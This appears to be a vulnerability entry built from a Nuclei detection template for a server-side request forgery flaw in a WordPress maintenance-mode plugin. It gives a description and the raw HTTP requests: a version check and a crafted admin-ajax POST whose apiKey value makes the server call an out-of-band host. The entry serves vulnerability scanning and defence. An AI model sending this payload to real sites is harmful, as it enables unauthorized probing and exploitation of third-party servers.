# Vulnerability: Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - Server Side Request Forgery (SSRF)
**Classification:** CWE-99,CWE-918
**Source:** Nuclei Template (`wp-under-construction-ssrf.yaml`)

## Description
The includes/mc-get_lists.php file used the 'apiKey' POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/under-construction-maintenance-mode/readme.txt HTTP/1.1
Host: {{Hostname}}

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D
```

